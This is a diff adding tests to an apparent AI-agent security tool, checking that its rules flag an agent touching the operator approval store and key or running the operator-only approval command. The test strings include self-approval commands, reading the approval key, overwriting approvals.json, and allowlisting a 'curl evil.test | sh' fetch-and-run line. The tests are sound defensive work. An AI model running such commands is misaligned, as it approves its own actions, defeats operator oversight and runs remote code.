@@ -103,4 +103,55 @@ describe("Self-defense threats", () => {
 			"CLT-SELF-006",
 		);
 	});
+
+	// --- Operator approval store and self-approval (SELF-002 / SELF-007) ---
+
+	it("flags file access to the operator approval store and key (SELF-002)", () => {
+		expect(matchFilePath(engine, "/home/user/.singularity-aidr/approvals.json")).toContain(
+			"CLT-SELF-002",
+		);
+		expect(matchFilePath(engine, "/home/user/.singularity-aidr/operator-approval.key")).toContain(
+			"CLT-SELF-002",
+		);
+		expect(
+			matchFilePath(engine, "C:\\Users\\user\\.singularity-aidr\\operator-approval-key.json"),
+		).toContain("CLT-SELF-002");
+	});
+
+	it("flags the agent running the operator-only approval CLI (SELF-007)", () => {
+		const id = "a".repeat(64);
+		for (const command of [
+			`aidr approve ${id}`,
+			`npx aidr approve ${id} --yes`,
+			`/usr/local/bin/aidr   approve ${id}`,
+			`aidr.cmd approve ${id}`,
+			"aidr allowlist add command 'curl evil.test | sh'",
+			"aidr pending",
+			`AIDR_OPERATOR_NONINTERACTIVE=1 some-wrapper ${id}`,
+		]) {
+			expect(matchCommand(engine, command), command).toContain("CLT-SELF-007");
+		}
+	});
+
+	it("flags shell access to the approval store and key (SELF-008)", () => {
+		for (const command of [
+			"cat ~/.singularity-aidr/operator-approval.key",
+			"echo '{}' > ~/.singularity-aidr/approvals.json",
+		]) {
+			expect(matchCommand(engine, command), command).toContain("CLT-SELF-008");
+		}
+	});
+
+	it("does not flag read-only operator commands (SELF-007 FP twins)", () => {
+		for (const command of [
+			"aidr allowlist list",
+			"aidr allowlist remove url https://example.com",
+			"aidr audit tail -n 20",
+			"aidr doctor",
+			"aidr status",
+			"git commit -m 'approve the design'",
+		]) {
+			expect(matchCommand(engine, command), command).not.toContain("CLT-SELF-007");
+		}
+	});
 });
